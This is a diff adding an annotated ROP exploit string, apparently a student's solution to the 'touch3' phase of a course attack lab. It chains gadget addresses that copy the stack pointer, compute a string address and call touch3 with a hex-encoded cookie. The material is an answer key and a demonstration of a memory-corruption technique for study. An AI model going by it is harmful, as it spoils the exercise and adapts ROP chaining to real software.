@@ -1,0 +1,23 @@
+31 19 40 00 00 00 00 00
+movq %rsp, %rax = 48 89 e0 c3
+c2 19 40 00 00 00 00 00
+movl %eax, %ecx = 89 c1 90 c3
+9c 19 40 00 00 00 00 00
+movl %ecx, %edx = 89 ca 90 c3
+c9 19 40 00 00 00 00 00
+movl %edx, %esi = 89 d6 c3 
+d5 18 40 00 00 00 00 00
+popq %rax = 58 c3
+41 00 00 00 00 00 00 00  /* offset from rsp for the string */ 
+e7 18 40 00 00 00 00 00
+movq %rax, %rdi = 48 89 c7 c3
+07 19 40 00 00 00 00 00
+lea    (%rdi,%rsi,1),%rax 48 8d 04 37      ret c3 
+e7 18 40 00 00 00 00 00
+movq %rax, %rdi = 48 89 c7 c3
+3c 18 40 00 00 00 00 00
+touch3
+35 61 34 66 37 39 36 62 00
+
+36 1b 40 00 00 00 00 00 1
+
